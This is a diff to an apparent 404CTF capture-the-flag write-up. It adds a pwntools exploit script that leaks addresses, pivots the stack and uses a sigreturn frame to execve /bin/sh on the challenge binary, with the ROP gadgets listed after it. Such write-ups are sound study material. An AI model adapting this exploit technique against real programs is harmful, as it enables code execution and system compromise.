@@ -269,9 +269,133 @@ gadget 0:
 
 And get a shell.
 
-### Proof of Concept
 ![PoC](https://github.com/MohandAcherir/Writeups/blob/main/404CTF/Screenshot%20from%202025-05-28%2016-43-38.png)
 
+
+### Proof of Concept
+
+```
+from pwn import *
+import re
+import time
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+#p = remote('challenges.404ctf.fr', 32468)
+p = process('./chall')
+
+
+def extract(data):
+    parts = data.split(b'22 derniers bytes : ')
+    if len(parts) >= 2:
+        after_leak = parts[1]
+        leaked = after_leak.split(b'\n')[1][:6]  # first full line after leak
+        print(f"Leaked bytes: {leaked}")
+        print(f"As address: 0x{int.from_bytes(leaked, 'little'):012x}")
+        return int.from_bytes(leaked, 'little')
+    else:
+        print("Leak pattern not found.")
+    return addrs
+
+addrs = []
+for i in range(22, 45):
+    data = p.recv()
+    if i == 32 or i == 40:
+        print(f"FOR I = {i}")
+        print(data)
+        addrs.append(extract(data))
+    p.sendline(b"a"*(i))
+
+p.recv()
+print(addrs)
+
+gdb.attach(p, gdbscript='''
+b read
+''')
+
+main_offset = 0x443
+buffer_addr = addrs[0] - 48
+base_addr = addrs[1] - 0x443
+leave_ret = base_addr + 0x0000000000000367
+set_read = base_addr + 0x377
+syscall_addr = base_addr + 0x364
+set_rax = base_addr + 0x32e
+
+print(f"leave ret gadget : {hex(leave_ret)}")
+
+fake_rbp_1 = addrs[0] - 48
+print(f"base rbp : {hex(fake_rbp_1)}")
+
+x = 13
+y = 0
+payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+x) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + p64(leave_ret)
+print(f"[+] Send payload of length {hex(len(payload))}")
+
+p.sendline(payload)
+p.recv()
+
+frame = SigreturnFrame()
+frame.rax = 59                      # syscall number for execve
+frame.rdi = fake_rbp_1+296            # pointer to "/bin/sh"
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr            # address of `syscall` instruction
+frame.rsp = fake_rbp_1         # stack after syscall (can be just garbage)
+
+
+payload = p64(fake_rbp_1+40) + p64(set_rax) + p64(15) + p64(syscall_addr) + bytes(frame) + b"/bin/sh\x00"
+payload += b"b"*(0x100-len(payload))
+
+p.sendline(payload)
+p.interactive()
+p.close()
+
+
+"""
+gadget 0:
+   0x0000000000000364 : syscall
+
+gadget 1:
+   0x0000000000000377 <+14>:	mov    edi,DWORD PTR [rbp-0x4]
+   0x000000000000037a <+17>:	mov    rsi,QWORD PTR [rbp-0x10]
+   0x000000000000037e <+21>:	mov    edx,DWORD PTR [rbp-0x8]
+   0x0000000000000381 <+24>:	mov    eax,0x0
+   0x0000000000000386 <+29>:	syscall
+   0x0000000000000388 <+31>:	nop
+   0x0000000000000389 <+32>:	pop    rbp
+   0x000000000000038a <+33>:	ret
+   
+
+gadget 2:
+   0x000000000000034c <+24>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000000350 <+28>:	mov    edi,0x1
+   0x0000000000000355 <+33>:	mov    rsi,QWORD PTR [rbp-0x18]
+   0x0000000000000359 <+37>:	mov    rax,QWORD PTR [rbp-0x8]  
+   0x000000000000035d <+41>:	mov    edx,eax
+   0x000000000000035f <+43>:	mov    eax,0x1
+   0x0000000000000364 <+48>:	syscall
+   0x0000000000000366 <+50>:	nop
+   0x0000000000000367 <+51>:	leave
+   0x0000000000000368 <+52>:	ret
+
+gadget 3:
+   0x000000000000032e : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret`
+
+gadget 4:
+   0x000000000000041f <+148>:	mov    rdi,rax
+   0x0000000000000422 <+151>:	call   0x334 <puts>
+   0x0000000000000427 <+156>:	movzx  eax,BYTE PTR [rbp-0x4]
+   0x000000000000042b <+160>:	test   al,al
+   0x000000000000042d <+162>:	jne    0x3ab <main+32>
+   0x0000000000000433 <+168>:	mov    eax,0x0
+   0x0000000000000438 <+173>:	leave
+   0x0000000000000439 <+174>:	ret
+
+
+"""
+
+```
 
 
 
